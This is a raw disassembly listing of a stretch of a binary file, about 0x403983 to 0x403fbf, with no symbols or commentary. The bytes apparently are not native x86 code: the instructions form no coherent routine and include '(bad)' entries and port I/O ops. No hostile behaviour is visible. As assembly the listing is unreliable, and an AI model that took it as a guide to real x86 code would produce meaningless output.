  403983:	add    BYTE PTR [edx],cl
  403985:	sub    al,BYTE PTR [eax]
  403987:	add    BYTE PTR [ebx],bl
  403989:	xor    BYTE PTR [ecx],cl
  40398b:	add    cl,bh
  40398d:	add    DWORD PTR [eax],eax
  40398f:	add    BYTE PTR [ecx],ah
  403991:	add    BYTE PTR [eax],al
  403993:	adc    DWORD PTR [ebx],eax
  403995:	outs   dx,DWORD PTR ds:[esi]
  403996:	push   0xa060000
  40399b:	adc    al,0xb
  40399d:	push   es
  40399e:	jae    0x403976
  4039a0:	add    BYTE PTR [eax],al
  4039a2:	or     cl,BYTE PTR [ebx]
  4039a4:	adc    al,0xc
  4039a6:	push   ss
  4039a7:	or     eax,0x6f07522b
  4039ac:	xlat   BYTE PTR ds:[ebx]
  4039ad:	add    BYTE PTR [eax],al
  4039af:	or     dl,BYTE PTR [edi]
  4039b1:	xor    ecx,DWORD PTR [ecx+0x7]
  4039b4:	outs   dx,DWORD PTR ds:[esi]
  4039b5:	fadd   DWORD PTR [eax]
  4039b7:	add    BYTE PTR [edx],cl
  4039b9:	jb     0x40397b
  4039bb:	add    eax,DWORD PTR [eax]
  4039bd:	jo     0x4039da
  4039bf:	sub    BYTE PTR [edi+0x2c0a0000],dl
  4039c5:	ss pop ss
  4039c7:	or     eax,0xd96f07
  4039cc:	add    BYTE PTR [edx],cl
  4039ce:	es pop es
  4039d0:	outs   dx,DWORD PTR ds:[esi]
  4039d1:	fadd   DWORD PTR [eax]
  4039d3:	add    BYTE PTR [edx],cl
  4039d5:	jb     0x4039a9
  4039d7:	add    eax,DWORD PTR [eax]
  4039d9:	jo     0x4039f6
  4039db:	sub    BYTE PTR [edi+0x2c0a0000],dl
  4039e1:	or     DWORD PTR [edi],eax
  4039e3:	outs   dx,DWORD PTR ds:[esi]
  4039e4:	fiadd  DWORD PTR [eax]
  4039e6:	add    BYTE PTR [edx],cl
  4039e8:	or     al,0x2b
  4039ea:	or     BYTE PTR [edi],al
  4039ec:	outs   dx,DWORD PTR ds:[esi]
  4039ed:	fild   DWORD PTR [eax]
  4039ef:	add    BYTE PTR [edx],cl
  4039f1:	sub    eax,0xdc6f07dc
  4039f6:	add    BYTE PTR [eax],al
  4039f8:	or     ah,BYTE PTR [esi]
  4039fa:	sub    ecx,DWORD PTR [eax]
  4039fc:	pop    es
  4039fd:	outs   dx,DWORD PTR ds:[esi]
  4039fe:	fld    QWORD PTR [eax]
  403a00:	add    BYTE PTR [edx],cl
  403a02:	sub    eax,0x363909a6
  403a07:	add    DWORD PTR [eax],eax
  403a09:	add    BYTE PTR [esi],dl
  403a0b:	or     eax,0x12438
  403a10:	add    BYTE PTR [edi],al
  403a12:	outs   dx,DWORD PTR ds:[esi]
  403a13:	xlat   BYTE PTR ds:[ebx]
  403a14:	add    BYTE PTR [eax],al
  403a16:	or     dl,BYTE PTR [edi]
  403a18:	inc    eax
  403a19:	sbb    BYTE PTR [ecx],al
  403a1b:	add    BYTE PTR [eax],al
  403a1d:	pop    es
  403a1e:	outs   dx,DWORD PTR ds:[esi]
  403a1f:	fadd   DWORD PTR [eax]
  403a21:	add    BYTE PTR [edx],cl
  403a23:	jb     0x403a05
  403a25:	add    eax,DWORD PTR [eax]
  403a27:	jo     0x403a44
  403a29:	sub    BYTE PTR [edi+0x390a0000],dl
  403a2f:	add    al,BYTE PTR [ecx]
  403a31:	add    BYTE PTR [eax],al
  403a33:	pop    ss
  403a34:	or     eax,0xde73
  403a39:	or     dl,BYTE PTR [ebx]
  403a3b:	add    al,0x7
  403a3d:	outs   dx,DWORD PTR ds:[esi]
  403a3e:	fld    DWORD PTR [eax]
  403a40:	add    BYTE PTR [edx],cl
  403a42:	adc    DWORD PTR es:[edi+eax*1],eax
  403a46:	outs   dx,DWORD PTR ds:[esi]
  403a47:	fadd   DWORD PTR [eax]
  403a49:	add    BYTE PTR [edx],cl
  403a4b:	pop    es
  403a4c:	outs   dx,DWORD PTR ds:[esi]
  403a4d:	fiadd  DWORD PTR [eax]
  403a4f:	add    BYTE PTR [edx],cl
  403a51:	outs   dx,DWORD PTR ds:[esi]
  403a52:	fild   WORD PTR [eax]
  403a54:	add    BYTE PTR [edx],cl
  403a56:	pop    es
  403a57:	outs   dx,DWORD PTR ds:[esi]
  403a58:	fild   DWORD PTR [eax]
  403a5a:	add    BYTE PTR [edx],cl
  403a5c:	sub    eax,0x720411e5
  403a61:	jmp    0xe0:0x6f700003
  403a68:	add    BYTE PTR [edx],cl
  403a6a:	adc    eax,DWORD PTR ds:0x4720411
  403a70:	add    al,0x0
  403a72:	jo     0x403ae3
  403a74:	loopne 0x403a76
  403a76:	add    BYTE PTR [edx],cl
  403a78:	adc    eax,DWORD PTR [esi]
  403a7a:	adc    DWORD PTR [edx+esi*2],eax
  403a7d:	adc    al,0x4
  403a7f:	add    BYTE PTR [eax+0x6f],dh
  403a82:	loopne 0x403a84
  403a84:	add    BYTE PTR [edx],cl
  403a86:	adc    eax,DWORD PTR [edi]
  403a88:	adc    DWORD PTR [edx+esi*2],eax
  403a8b:	xor    al,BYTE PTR [eax+eax*1]
  403a8e:	jo     0x403aff
  403a90:	loopne 0x403a92
  403a92:	add    BYTE PTR [edx],cl
  403a94:	adc    ecx,DWORD PTR [eax]
  403a96:	adc    DWORD PTR [edx+esi*2],eax
  403a99:	inc    edx
  403a9a:	add    al,0x0
  403a9c:	jo     0x403b0d
  403a9e:	loopne 0x403aa0
  403aa0:	add    BYTE PTR [edx],cl
  403aa2:	adc    ecx,DWORD PTR [ecx]
  403aa4:	adc    DWORD PTR [edx+esi*2],eax
  403aa7:	dec    esi
  403aa8:	add    al,0x0
  403aaa:	jo     0x403b1b
  403aac:	loopne 0x403aae
  403aae:	add    BYTE PTR [edx],cl
  403ab0:	adc    ecx,DWORD PTR [edx]
  403ab2:	adc    DWORD PTR [ecx],ecx
  403ab4:	adc    cl,BYTE PTR [ebx]
  403ab6:	sub    cl,ah
  403ab8:	add    BYTE PTR [eax],al
  403aba:	or     ch,BYTE PTR ds:0xb131703
  403ac0:	adc    cl,BYTE PTR ds:0x1215fe
  403ac6:	add    BYTE PTR [ebx],bl
  403ac8:	adc    DWORD PTR [edx],ecx
  403aca:	adc    cl,BYTE PTR [eax+ebp*1]
  403acd:	loope  0x403acf
  403acf:	add    BYTE PTR [edx],cl
  403ad1:	sub    al,0x9
  403ad3:	adc    cl,BYTE PTR ds:0xe2280c11
  403ad9:	add    BYTE PTR [eax],al
  403adb:	or     dl,BYTE PTR [ecx]
  403add:	add    eax,0x9828
  403ae2:	or     ch,BYTE PTR ds:0x2806111e
  403ae8:	cwde   
  403ae9:	add    BYTE PTR [eax],al
  403aeb:	or     ch,BYTE PTR ds:0x28071115
  403af1:	cwde   
  403af2:	add    BYTE PTR [eax],al
  403af4:	or     ch,BYTE PTR ds:0x2808110c
  403afa:	cwde   
  403afb:	add    BYTE PTR [eax],al
  403afd:	or     dl,BYTE PTR [esi]
  403aff:	inc    BYTE PTR [ecx]
  403b01:	sub    eax,DWORD PTR [ecx]
  403b03:	push   ss
  403b04:	adc    ecx,DWORD PTR [esi]
  403b06:	adc    DWORD PTR [esi],ecx
  403b08:	sub    al,0x24
  403b0a:	add    bh,BYTE PTR [ebx+0x22]
  403b0d:	add    BYTE PTR [eax],al
  403b0f:	add    al,0x11
  403b11:	add    eax,0x7110611
  403b16:	adc    DWORD PTR [eax],ecx
  403b18:	adc    DWORD PTR [ebx],ecx
  403b1a:	adc    DWORD PTR ds:0x696f0308,ecx
  403b20:	add    BYTE PTR [eax],al
  403b22:	push   es
  403b23:	jae    0x403b91
  403b25:	add    BYTE PTR [eax],al
  403b27:	push   es
  403b28:	outs   dx,DWORD PTR ds:[esi]
  403b29:	jecxz  0x403b2b
  403b2b:	add    BYTE PTR [edx],cl
  403b2d:	es pop es
  403b2f:	outs   dx,DWORD PTR ds:[esi]
  403b30:	fadd   QWORD PTR [eax]
  403b32:	add    BYTE PTR [edx],cl
  403b34:	es pop es
  403b36:	outs   dx,DWORD PTR ds:[esi]
  403b37:	fld    QWORD PTR [eax]
  403b39:	add    BYTE PTR [edx],cl
  403b3b:	cmp    dl,cl
  403b3d:	(bad)  
  403b3e:	(bad)  
  403b3f:	(bad)  
  403b40:	fidivr WORD PTR [esi]
  403b42:	adc    ecx,DWORD PTR [edi]
  403b44:	add    bh,BYTE PTR [ebx+0x24]
  403b47:	add    BYTE PTR [eax],al
  403b49:	add    al,0x11
  403b4b:	movq   mm4,mm3
  403b4e:	add    BYTE PTR [eax],al
  403b50:	or     ah,BYTE PTR [esi]
  403b52:	add    bh,BYTE PTR [ebx+0x25]
  403b55:	add    BYTE PTR [eax],al
  403b57:	add    al,0x6
  403b59:	outs   dx,DWORD PTR ds:[esi]
  403b5a:	jecxz  0x403b5c
  403b5c:	add    BYTE PTR [edx],cl
  403b5e:	ficomp WORD PTR es:[edi]
  403b61:	adc    edx,DWORD PTR [eax]
  403b63:	add    bh,BYTE PTR [ebx+0x24]
  403b66:	add    BYTE PTR [eax],al
  403b68:	add    al,0x11
  403b6a:	adc    BYTE PTR [edi-0x1d],ch
  403b6d:	add    BYTE PTR [eax],al
  403b6f:	or     ah,BYTE PTR [esi]
  403b71:	add    bh,BYTE PTR [ebx+0x25]
  403b74:	add    BYTE PTR [eax],al
  403b76:	add    al,0x6
  403b78:	outs   dx,DWORD PTR ds:[esi]
  403b79:	jecxz  0x403b7b
  403b7b:	add    BYTE PTR [edx],cl
  403b7d:	fiadd  WORD PTR es:[eax]
  403b80:	fimul  WORD PTR [edx]
  403b82:	pop    es
  403b83:	sub    al,0x6
  403b85:	pop    es
  403b86:	outs   dx,DWORD PTR ds:[esi]
  403b87:	in     al,0x0
  403b89:	add    BYTE PTR [edx],cl
  403b8b:	fsubr  QWORD PTR [edx]
  403b8d:	add    BYTE PTR [eax],al
  403b8f:	add    BYTE PTR [ecx+0x4c],al
  403b92:	add    BYTE PTR [eax],al
  403b94:	add    BYTE PTR [eax],al
  403b96:	add    BYTE PTR [eax],al
  403b98:	or     DWORD PTR [eax],eax
  403b9a:	add    BYTE PTR [eax],al
  403b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b9d:	add    DWORD PTR [eax],eax
  403b9f:	add    BYTE PTR [esi+0x1f000001],ch
  403ba5:	add    BYTE PTR [eax],al
  403ba7:	add    BYTE PTR [esi+0x10000],ch
  403bad:	add    BYTE PTR [eax],al
  403baf:	add    BYTE PTR [ecx],cl
  403bb1:	add    BYTE PTR [eax],al
  403bb3:	add    BYTE PTR [ebp-0x32ffffff],ah
  403bb9:	add    DWORD PTR [eax],eax
  403bbb:	add    BYTE PTR [edi],bl
  403bbd:	add    BYTE PTR [eax],al
  403bbf:	add    BYTE PTR [esi],dh
  403bc1:	add    BYTE PTR [eax],al
  403bc3:	add    DWORD PTR [edx],eax
  403bc5:	add    BYTE PTR [eax],al
  403bc7:	add    BYTE PTR [ecx],cl
  403bc9:	add    BYTE PTR [eax],al
  403bcb:	add    ch,ah
  403bcd:	add    DWORD PTR [eax],eax
  403bcf:	add    dh,ch
  403bd1:	add    DWORD PTR [eax],eax
  403bd3:	add    BYTE PTR [edx],cl
  403bd5:	add    BYTE PTR [eax],al
  403bd7:	add    BYTE PTR [eax],al
  403bd9:	add    BYTE PTR [eax],al
  403bdb:	add    BYTE PTR [edx+0x2128],dl
  403be1:	or     dh,BYTE PTR [ebx-0x45]
  403be4:	add    BYTE PTR [eax],al
  403be6:	or     al,BYTE PTR [eax+0x4000021]
  403bec:	jae    0x403c52
  403bee:	add    BYTE PTR [eax],al
  403bf0:	push   es
  403bf1:	sub    BYTE PTR [ecx],0x0
  403bf4:	add    BYTE PTR [ebx+esi*2],al
  403bf7:	data16 add BYTE PTR [eax],al
  403bfa:	push   es
  403bfb:	sub    BYTE PTR [edx],0x0
  403bfe:	add    BYTE PTR [edx+ebp*1],al
  403c01:	or     dl,BYTE PTR [esi]
  403c03:	sub    bl,BYTE PTR [esi]
  403c05:	add    ch,BYTE PTR [eax]
  403c07:	pop    eax
  403c08:	add    BYTE PTR [eax],al
  403c0a:	or     ch,BYTE PTR [edx]
  403c0c:	adc    esi,DWORD PTR [eax]
  403c0e:	add    eax,DWORD PTR [eax]
  403c10:	sub    DWORD PTR [eax],eax
  403c12:	add    BYTE PTR [eax],al
  403c14:	and    al,BYTE PTR [eax]
  403c16:	add    BYTE PTR [ecx],dl
  403c18:	add    esi,DWORD PTR [edi+ecx*1+0x0]
  403c1c:	add    BYTE PTR [edx],al
  403c1e:	or     al,BYTE PTR [esp+esi*2]
  403c21:	sldt   WORD PTR [eax]
  403c24:	add    cl,BYTE PTR [ebx]
  403c26:	push   es
  403c27:	sub    al,0x3
  403c29:	pop    es
  403c2a:	sub    eax,0x62a1602
  403c2f:	outs   dx,DWORD PTR ds:[esi]
  403c30:	ins    DWORD PTR es:[edi],dx
  403c31:	add    BYTE PTR [eax],al
  403c33:	push   es
  403c34:	pop    es
  403c35:	outs   dx,DWORD PTR ds:[esi]
  403c36:	ins    DWORD PTR es:[edi],dx
  403c37:	add    BYTE PTR [eax],al
  403c39:	push   es
  403c3a:	sbb    ebp,DWORD PTR [eax]
  403c3c:	xchg   DWORD PTR [eax],eax
  403c3e:	add    BYTE PTR [edx],cl
  403c40:	sub    bl,BYTE PTR [esi]
  403c42:	add    ch,BYTE PTR [eax]
  403c44:	pop    eax
  403c45:	add    BYTE PTR [eax],al
  403c47:	or     ch,BYTE PTR [edx]
  403c49:	push   esi
  403c4a:	add    ch,BYTE PTR [eax]
  403c4c:	pop    eax
  403c4d:	add    BYTE PTR [eax],al
  403c4f:	or     al,BYTE PTR [edx]
  403c51:	add    edi,DWORD PTR [ebp+0x2b]
  403c54:	add    BYTE PTR [eax],al
  403c56:	add    al,0x2
  403c58:	add    al,0x7d
  403c5a:	sub    al,0x0
  403c5c:	add    BYTE PTR [edx+ebp*1],al
  403c5f:	push   ds
  403c60:	add    bh,BYTE PTR [ebx+0x2b]
  403c63:	add    BYTE PTR [eax],al
  403c65:	add    al,0x2a
  403c67:	push   ds
  403c68:	add    bh,BYTE PTR [ebx+0x2c]
  403c6b:	add    BYTE PTR [eax],al
  403c6d:	add    al,0x2a
  403c6f:	call   0x400:0x2d7b02
  403c76:	sub    eax,0x7b020217
  403c7b:	sub    eax,DWORD PTR [eax]
  403c7d:	add    BYTE PTR [edx+eax*1],al
  403c80:	jnp    0x403cae
  403c82:	add    BYTE PTR [eax],al
  403c84:	add    al,0x28
  403c86:	and    eax,DWORD PTR [eax]
  403c88:	add    BYTE PTR [edx],cl
  403c8a:	jge    0x403cb9
  403c8c:	add    BYTE PTR [eax],al
  403c8e:	add    al,0x2
  403c90:	jnp    0x403cbf
  403c92:	add    BYTE PTR [eax],al
  403c94:	add    al,0x2a
  403c96:	add    BYTE PTR [eax],al
  403c98:	adc    esi,DWORD PTR [eax]
  403c9a:	add    eax,DWORD PTR [eax]
  403c9c:	sbb    al,BYTE PTR [eax]
  403c9e:	add    BYTE PTR [eax],al
  403ca0:	and    eax,DWORD PTR [eax]
  403ca2:	add    BYTE PTR [ecx],dl
  403ca4:	add    esi,DWORD PTR [esi+ecx*1+0x0]
  403ca8:	add    BYTE PTR [edx],al
  403caa:	or     al,BYTE PTR [edx]
  403cac:	sub    BYTE PTR [edx+0x0],ch
  403caf:	add    BYTE PTR [esi],al
  403cb1:	push   es
  403cb2:	outs   dx,DWORD PTR ds:[esi]
  403cb3:	push   0x0
  403cb5:	add    BYTE PTR [esi],al
  403cb7:	sbb    ebp,DWORD PTR [eax]
  403cb9:	xchg   DWORD PTR [eax],eax
  403cbb:	add    BYTE PTR [edx],cl
  403cbd:	sub    al,BYTE PTR [eax]
  403cbf:	add    BYTE PTR [ebx],dl
  403cc1:	xor    BYTE PTR [esi],al
  403cc3:	add    BYTE PTR [eax+eax*1+0x0],bl
  403cc7:	add    BYTE PTR [eax+eax*1],ah
  403cca:	add    BYTE PTR [ecx],dl
  403ccc:	add    ch,BYTE PTR [eax]
  403cce:	pop    eax
  403ccf:	add    BYTE PTR [eax],al
  403cd1:	or     al,BYTE PTR [edx]
  403cd3:	add    edi,DWORD PTR [ebp+0x32]
  403cd6:	add    BYTE PTR [eax],al
  403cd8:	add    al,0x2
  403cda:	sub    BYTE PTR [esi],dh
  403cdc:	add    BYTE PTR [eax],al
  403cde:	or     dh,BYTE PTR [edx+0x68]
  403ce1:	add    al,0x0
  403ce3:	jo     0x403cff
  403ce5:	lea    eax,[ecx]
  403ce7:	add    BYTE PTR [eax],al
  403ce9:	add    DWORD PTR [edx],ecx
  403ceb:	push   es
  403cec:	push   ss
  403ced:	add    esp,DWORD PTR [edx-0x5dfbe8fa]
  403cf3:	push   es
  403cf4:	sbb    BYTE PTR [esi],cl
  403cf6:	add    al,0xa2
  403cf8:	push   es
  403cf9:	sbb    DWORD PTR ds:0xe52806a2,eax
  403cff:	add    BYTE PTR [eax],al
  403d01:	or     bh,BYTE PTR [ebp+0x2e]
  403d04:	add    BYTE PTR [eax],al
  403d06:	add    al,0x2
  403d08:	push   cs
  403d09:	add    eax,0x2f7d
  403d0e:	add    al,0x2
  403d10:	push   cs
  403d11:	push   es
  403d12:	jge    0x403d44
  403d14:	add    BYTE PTR [eax],al
  403d16:	add    al,0x2
  403d18:	push   cs
  403d19:	pop    es
  403d1a:	jge    0x403d4d
  403d1c:	add    BYTE PTR [eax],al
  403d1e:	add    al,0x2
  403d20:	push   cs
  403d21:	or     BYTE PTR [ebp+0x33],bh
  403d24:	add    BYTE PTR [eax],al
  403d26:	add    al,0x2a
  403d28:	push   ds
  403d29:	add    bh,BYTE PTR [ebx+0x2e]
  403d2c:	add    BYTE PTR [eax],al
  403d2e:	add    al,0x2a
  403d30:	push   ds
  403d31:	add    bh,BYTE PTR [ebx+0x2f]
  403d34:	add    BYTE PTR [eax],al
  403d36:	add    al,0x2a
  403d38:	push   ds
  403d39:	add    bh,BYTE PTR [ebx+0x30]
  403d3c:	add    BYTE PTR [eax],al
  403d3e:	add    al,0x2a
  403d40:	push   ds
  403d41:	add    bh,BYTE PTR [ebx+0x31]
  403d44:	add    BYTE PTR [eax],al
  403d46:	add    al,0x2a
  403d48:	push   ds
  403d49:	add    bh,BYTE PTR [ebx+0x32]
  403d4c:	add    BYTE PTR [eax],al
  403d4e:	add    al,0x2a
  403d50:	push   ds
  403d51:	add    bh,BYTE PTR [ebx+0x33]
  403d54:	add    BYTE PTR [eax],al
  403d56:	add    al,0x2a
  403d58:	push   ds
  403d59:	add    bh,BYTE PTR [ebx+0x42]
  403d5c:	add    BYTE PTR [eax],al
  403d5e:	add    al,0x2a
  403d60:	and    al,BYTE PTR [edx]
  403d62:	add    edi,DWORD PTR [ebp+0x42]
  403d65:	add    BYTE PTR [eax],al
  403d67:	add    al,0x2a
  403d69:	add    BYTE PTR [eax],al
  403d6b:	add    BYTE PTR [ebx],dl
  403d6d:	xor    BYTE PTR [edx],al
  403d6f:	add    BYTE PTR [ecx],dh
  403d71:	add    BYTE PTR [eax],al
  403d73:	add    BYTE PTR ds:0x2110000,ah
  403d79:	sub    BYTE PTR [esi+0x280a0000],dl
  403d7f:	out    0x0,eax
  403d81:	add    BYTE PTR [edx],cl
  403d83:	sub    al,0x23
  403d85:	sub    bh,ah
  403d87:	add    BYTE PTR [eax],al
  403d89:	or     ch,BYTE PTR [edi+0x4]
  403d8c:	add    BYTE PTR [eax],al
  403d8e:	sub    ecx,DWORD PTR [edx]
  403d90:	add    al,BYTE PTR [esi]
  403d92:	jae    0x403d26
  403d94:	add    BYTE PTR [eax],al
  403d96:	push   es
  403d97:	jge    0x403dcd
  403d99:	add    BYTE PTR [eax],al
  403d9b:	add    al,0x2
  403d9d:	pop    ss
  403d9e:	jae    0x403d89
  403da0:	add    BYTE PTR [eax],al
  403da2:	or     bh,BYTE PTR [ebp+0x41]
  403da5:	add    BYTE PTR [eax],al
  403da7:	add    al,0x2a
  403da9:	add    BYTE PTR [eax],al
  403dab:	add    BYTE PTR [ebx],dl
  403dad:	xor    BYTE PTR [edx],al
  403daf:	add    BYTE PTR [eax+eax*1],dh
  403db2:	add    BYTE PTR [eax],al
  403db4:	add    BYTE PTR es:[eax],al
  403db7:	adc    DWORD PTR [edx],eax
  403db9:	jnp    0x403dfb
  403dbb:	add    BYTE PTR [eax],al
  403dbd:	add    al,0x2d
  403dbf:	sub    eax,DWORD PTR [edx]
  403dc1:	jnp    0x403df7
  403dc3:	add    BYTE PTR [eax],al
  403dc5:	add    al,0x28
  403dc7:	jmp    0x2d:0x740a0000
  403dce:	add    BYTE PTR [ecx],al
  403dd0:	or     al,BYTE PTR [esi]
  403dd2:	sub    al,0x17
  403dd4:	add    dh,BYTE PTR [ebx+0x2b]
  403dd7:	add    BYTE PTR [eax],al
  403dd9:	push   es
  403dda:	jge    0x403e1c
  403ddc:	add    BYTE PTR [eax],al
  403dde:	add    al,0x6
  403de0:	add    bh,BYTE PTR [ebx+0x40]
  403de3:	add    BYTE PTR [eax],al
  403de5:	add    al,0x6f
  403de7:	jmp    0x403de9
  403de9:	add    BYTE PTR [edx],cl
  403deb:	sub    bh,BYTE PTR [edx]
  403ded:	add    dl,BYTE PTR [edi]
  403def:	sub    BYTE PTR [eax+0x0],bh
  403df2:	add    BYTE PTR [esi],al
  403df4:	add    ch,BYTE PTR [eax]
  403df6:	in     al,dx
  403df7:	add    BYTE PTR [eax],al
  403df9:	or     ch,BYTE PTR [edx]
  403dfb:	add    BYTE PTR [ebx],bl
  403dfd:	xor    BYTE PTR [ebx],al
  403dff:	add    cl,dl
  403e01:	add    BYTE PTR [eax],al
  403e03:	add    BYTE PTR [esi],ah
  403e05:	add    BYTE PTR [eax],al
  403e07:	adc    DWORD PTR [ebx],eax
  403e09:	cmp    edx,ecx
  403e0b:	add    BYTE PTR [eax],al
  403e0d:	add    BYTE PTR [edx],al
  403e0f:	jnp    0x403e4a
  403e11:	add    BYTE PTR [eax],al
  403e13:	add    al,0x2c
  403e15:	pop    esp
  403e16:	add    bh,BYTE PTR [ebx+0x39]
  403e19:	add    BYTE PTR [eax],al
  403e1b:	add    al,0x2
  403e1d:	inc    BYTE PTR [esi]
  403e1f:	nop
  403e20:	add    BYTE PTR [eax],al
  403e22:	push   es
  403e23:	jae    0x403e12
  403e25:	add    BYTE PTR [eax],al
  403e27:	or     ch,BYTE PTR [edi-0x12]
  403e2a:	add    BYTE PTR [eax],al
  403e2c:	or     al,BYTE PTR [edx]
  403e2e:	jnp    0x403e69
  403e30:	add    BYTE PTR [eax],al
  403e32:	add    al,0x2
  403e34:	inc    BYTE PTR [esi]
  403e36:	xchg   ecx,eax
  403e37:	add    BYTE PTR [eax],al
  403e39:	push   es
  403e3a:	jae    0x403e29
  403e3c:	add    BYTE PTR [eax],al
  403e3e:	or     ch,BYTE PTR [edi-0x11]
  403e41:	add    BYTE PTR [eax],al
  403e43:	or     al,BYTE PTR [edx]
  403e45:	jnp    0x403e80
  403e47:	add    BYTE PTR [eax],al
  403e49:	add    al,0x2
  403e4b:	inc    BYTE PTR [esi]
  403e4d:	pop    DWORD PTR [eax]
  403e4f:	add    BYTE PTR [esi],al
  403e51:	jae    0x403e8d
  403e53:	add    BYTE PTR [eax],al
  403e55:	or     ch,BYTE PTR [edi-0x10]
  403e58:	add    BYTE PTR [eax],al
  403e5a:	or     al,BYTE PTR [edx]
  403e5c:	jnp    0x403e97
  403e5e:	add    BYTE PTR [eax],al
  403e60:	add    al,0x6f
  403e62:	inc    ebx
  403e63:	add    BYTE PTR [eax],al
  403e65:	or     bl,dh
  403e67:	add    esp,DWORD PTR [esi]
  403e69:	fiadd  WORD PTR [eax]
  403e6b:	add    dl,BYTE PTR [edi*2+0x4000039]
  403e72:	add    bh,BYTE PTR [ebx+0x34]
  403e75:	add    BYTE PTR [eax],al
  403e77:	add    al,0x2c
  403e79:	add    bh,BYTE PTR ss:[ebx+0x40]
  403e7d:	add    BYTE PTR [eax],al
  403e7f:	add    al,0x2c
  403e81:	daa    
  403e82:	add    bh,BYTE PTR [ebx+0x34]
  403e85:	add    BYTE PTR [eax],al
  403e87:	add    al,0x28
  403e89:	jmp    0x2d:0x740a0000
  403e90:	add    BYTE PTR [ecx],al
  403e92:	or     al,BYTE PTR [esi]
  403e94:	sub    al,0xc
  403e96:	push   es
  403e97:	add    bh,BYTE PTR [ebx+0x40]
  403e9a:	add    BYTE PTR [eax],al
  403e9c:	add    al,0x6f
  403e9e:	icebp  
  403e9f:	add    BYTE PTR [eax],al
  403ea1:	or     al,BYTE PTR [edx]
  403ea3:	adc    al,0x7d
  403ea5:	inc    eax
  403ea6:	add    BYTE PTR [eax],al
  403ea8:	add    al,0x2
  403eaa:	adc    al,0x7d
  403eac:	xor    al,0x0
  403eae:	add    BYTE PTR [edx+eax*1],al
  403eb1:	adc    al,0x7d
  403eb3:	cmp    eax,DWORD PTR [eax]
  403eb5:	add    BYTE PTR [edx+eax*1],al
  403eb8:	adc    al,0x7d
  403eba:	cmp    al,0x0
  403ebc:	add    BYTE PTR [edx+eax*1],al
  403ebf:	jnp    0x403f02
  403ec1:	add    BYTE PTR [eax],al
  403ec3:	add    al,0x2c
  403ec5:	adc    al,BYTE PTR [edx]
  403ec7:	jnp    0x403f0a
  403ec9:	add    BYTE PTR [eax],al
  403ecb:	add    al,0x6f
  403ecd:	xor    eax,0x20a0000
  403ed2:	adc    al,0x7d
  403ed4:	inc    ecx
  403ed5:	add    BYTE PTR [eax],al
  403ed7:	add    al,0x2a
  403ed9:	add    BYTE PTR [eax],al
  403edb:	add    BYTE PTR [ecx],al
  403edd:	adc    BYTE PTR [eax],al
  403edf:	add    BYTE PTR [eax],al
  403ee1:	add    BYTE PTR [esi],cl
  403ee3:	add    BYTE PTR [edx+0x60],dl
  403ee6:	add    BYTE PTR [ebx],al
  403ee8:	add    BYTE PTR ss:[eax],al
  403eeb:	add    DWORD PTR [ebx],ebx
  403eed:	xor    BYTE PTR [esi],al
  403eef:	add    BYTE PTR [edx+0x27000001],ch
  403ef5:	add    BYTE PTR [eax],al
  403ef7:	adc    DWORD PTR [edx],eax
  403ef9:	add    edi,DWORD PTR [ebp+0x35]
  403efc:	add    BYTE PTR [eax],al
  403efe:	add    al,0x2
  403f00:	add    al,0x7d
  403f02:	add    BYTE PTR ss:[eax],al
  403f05:	add    al,0x2
  403f07:	add    eax,0x387d
  403f0c:	add    al,0x2
  403f0e:	push   cs
  403f0f:	add    al,0x28
  403f11:	cwde   
  403f12:	add    BYTE PTR [eax],al
  403f14:	or     ch,BYTE PTR ds:0x2b040e04
  403f1a:	add    DWORD PTR [edi*2+0x4000037],edx
  403f21:	add    cl,BYTE PTR [esi]
  403f23:	or     BYTE PTR [ebx-0x65],dh
  403f26:	add    BYTE PTR [eax],al
  403f28:	or     bh,BYTE PTR [ebp+0x3d]
  403f2b:	add    BYTE PTR [eax],al
  403f2d:	add    al,0x2
  403f2f:	push   cs
  403f30:	or     DWORD PTR [ebp+0x3f],edi
  403f33:	add    BYTE PTR [eax],al
  403f35:	add    al,0x14
  403f37:	or     cl,BYTE PTR [esi]
  403f39:	add    al,0x28
  403f3b:	cwde   
  403f3c:	add    BYTE PTR [eax],al
  403f3e:	or     ch,BYTE PTR [esi+edx*1]
  403f41:	push   cs
  403f42:	add    eax,0x9828
  403f47:	or     ch,BYTE PTR [ecx*1-0x67d7f9f2]
  403f4e:	add    BYTE PTR [eax],al
  403f50:	or     ch,BYTE PTR [esp+eax*1]
  403f53:	push   cs
  403f54:	pop    es
  403f55:	sub    al,0x1e
  403f57:	jae    0x403f4b
  403f59:	add    BYTE PTR [eax],al
  403f5b:	or     cl,BYTE PTR [edx]
  403f5d:	push   es
  403f5e:	push   cs
  403f5f:	pop    es
  403f60:	outs   dx,DWORD PTR ds:[esi]
  403f61:	repz add BYTE PTR [eax],al
  403f64:	or     al,BYTE PTR [esi]
  403f66:	push   cs
  403f67:	add    eax,0xf46f
  403f6c:	or     al,BYTE PTR [esi]
  403f6e:	push   cs
  403f6f:	push   es
  403f70:	outs   dx,DWORD PTR ds:[esi]
  403f71:	cmc    
  403f72:	add    BYTE PTR [eax],al
  403f74:	or     al,BYTE PTR [edx]
  403f76:	add    bh,BYTE PTR [ebx+0x36]
  403f79:	add    BYTE PTR [eax],al
  403f7b:	add    al,0x72
  403f7d:	int3   
  403f7e:	add    al,0x0
  403f80:	jo     0x403faa
  403f82:	xchg   esp,eax
  403f83:	add    BYTE PTR [eax],al
  403f85:	or     bh,BYTE PTR [ebp+0x3a]
  403f88:	add    BYTE PTR [eax],al
  403f8a:	add    al,0x2
  403f8c:	jae    0x403fba
  403f8e:	add    BYTE PTR [eax],al
  403f90:	push   es
  403f91:	jge    0x403fd1
  403f93:	add    BYTE PTR [eax],al
  403f95:	add    al,0x2
  403f97:	jnp    0x403fd7
  403f99:	add    BYTE PTR [eax],al
  403f9b:	add    al,0xe
  403f9d:	or     BYTE PTR [edx],al
  403f9f:	jnp    0x403fdb
  403fa1:	add    BYTE PTR [eax],al
  403fa3:	add    al,0x72
  403fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa6:	add    al,BYTE PTR [eax]
  403fa8:	jo     0x404019
  403faa:	add    BYTE PTR ss:[eax],al
  403fad:	push   es
  403fae:	add    al,BYTE PTR [edx]
  403fb0:	jnp    0x403ff0
  403fb2:	add    BYTE PTR [eax],al
  403fb4:	add    al,0x2
  403fb6:	jnp    0x403ff6
  403fb8:	add    BYTE PTR [eax],al
  403fba:	add    al,0x73
  403fbc:	test   BYTE PTR [eax],0x0
  403fbf:	or     bh,BYTE PTR [ebp+0x3c]
